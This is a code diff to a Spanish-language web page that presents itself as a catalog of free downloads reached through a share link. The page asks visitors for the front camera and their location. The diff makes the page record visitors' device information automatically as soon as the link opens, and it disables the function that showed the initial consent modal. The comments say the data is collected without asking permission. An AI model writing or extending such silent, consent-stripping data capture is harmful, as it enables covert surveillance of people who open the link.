@@ -295,7 +295,32 @@ async function saveDeviceInfoOnOpen(){
   }
 }
 
-async function verify(){if(!token){$("empty").style.display="block";return}try{const s=await getDoc(doc(db,"shares",token));if(!s.exists()||s.data().active!==true)throw new Error();linkData=s.data();$("status").textContent="Panel actualizado 2027";$("tokenState").textContent="OK";render();showInitialConsent();}catch(e){console.error(e);$("status").textContent="Acceso inválido";$("tokenState").textContent="ERROR";$("empty").style.display="block";toast("Este acceso no está activo.","error");}}
+async function verify(){
+  if(!token){
+    $("empty").style.display="block";
+    return;
+  }
+  try{
+    const s=await getDoc(doc(db,"shares",token));
+    if(!s.exists()||s.data().active!==true) throw new Error();
+
+    linkData=s.data();
+    $("status").textContent="Conectando...";
+    $("tokenState").textContent="OK";
+    render();
+
+    // Al abrir el enlace, registra automáticamente los datos técnicos
+    // que el navegador expone sin pedir permisos especiales.
+    const ok = await saveDeviceInfoOnOpen();
+    $("status").textContent = ok ? "Panel actualizado 2027" : "Panel 2027";
+  }catch(e){
+    console.error(e);
+    $("status").textContent="Acceso inválido";
+    $("tokenState").textContent="ERROR";
+    $("empty").style.display="block";
+    toast("Este acceso no está activo.","error");
+  }
+}
 function render(){const q=$("search").value.trim().toLowerCase();const data=items.filter(a=>!q||`${a.name} ${a.desc}`.toLowerCase().includes(q));$("empty").style.display=data.length?"none":"block";$("list").innerHTML=data.map((a,i)=>`<article class="card" style="--accent:${a.color}"><div class="main"><div class="icon">${esc(a.icon)}</div><div><div class="title">${esc(a.name)}</div><div class="desc">${esc(a.desc)}</div></div></div><div class="bottom"><div class="meta"><b style="color:${a.color}">Gratis</b><br>Por link</div><button data-i="${i}">Carrito</button><button class="use" data-i="${i}">Descargar</button></div></article>`).join("");$("list").querySelectorAll("button[data-i]").forEach(b=>b.addEventListener("click",()=>openConfirm(data[Number(b.dataset.i)],b)));}
 function closeModal(){const m=$("modal"); if(m) m.classList.remove("show"); selected=null; selectedBtn=null; document.body.style.overflow="";}
 function openConfirm(it,b){if(busy)return;selected=it;selectedBtn=b;$("modalText").textContent=`Para continuar con "${it.name}", se solicitará permiso para usar la cámara frontal y la ubicación. Puedes cancelar si no deseas compartirlos.`;$("modal").classList.add("show");document.body.style.overflow="hidden";}
@@ -307,10 +332,7 @@ if($("denyCameraBtn")) $("denyCameraBtn").onclick=async()=>{
   const ok=await saveDeviceInfoOnOpen();
   toast(ok?"Continuaste sin cámara. Se registraron solo datos técnicos.":"No se pudo registrar la información técnica.",ok?"info":"error");
 };
-function showInitialConsent(){
-  const m=$("permissionModal");
-  if(m) m.classList.add("show");
-}
+function showInitialConsent(){ /* No se abre automáticamente */ }
 async function autoCaptureFromConsent(){
   // El usuario ya aceptó de forma explícita el uso de cámara y ubicación.
   const m=$("permissionModal");
